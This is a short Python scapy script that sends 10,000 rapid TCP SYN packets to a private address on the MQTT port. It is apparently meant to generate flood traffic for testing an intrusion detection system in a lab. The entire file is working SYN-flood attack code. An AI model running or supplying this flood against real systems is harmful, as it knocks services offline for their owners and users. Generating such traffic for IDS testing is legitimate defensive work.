from scapy.all import IP, TCP, send
import random
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

def send_extremely_aggressive_syn_flood(dst_ip, dst_port, total_packets=10000, delay=0.00005):
    """
    Sends a high volume of TCP SYN packets rapidly with minimal delay to simulate an intense SYN flood.
    - SYN flag count is high
    - ACK flag count remains zero
    - Flow Duration is controlled to span a few seconds, making it more detectable.
    """
    logging.info("Starting extremely aggressive SYN flood attack...")

    for _ in range(total_packets):
        packet = IP(dst=dst_ip) / TCP(dport=dst_port, sport=random.randint(1024, 65535), flags="S")
        send(packet, verbose=False)
        time.sleep(delay)  # Very minimal delay to increase packet rate and flow duration

    logging.info("Extremely aggressive SYN flood attack completed.")

def simulate_attack(dst_ip, dst_port):
    """
    Runs the extremely aggressive SYN flood to generate high 'DDoS' probability features.
    """
    logging.info("Starting highly aggressive traffic simulation...")

    # Perform intense SYN flood
    send_extremely_aggressive_syn_flood(dst_ip, dst_port, total_packets=10000, delay=0.00005)

    logging.info("Aggressive traffic simulation completed.")

if __name__ == "__main__":
    # Target IP and port for IDS monitoring
    TARGET_IP = "172.18.0.2"
    TARGET_PORT = 1883

    simulate_attack(TARGET_IP, TARGET_PORT)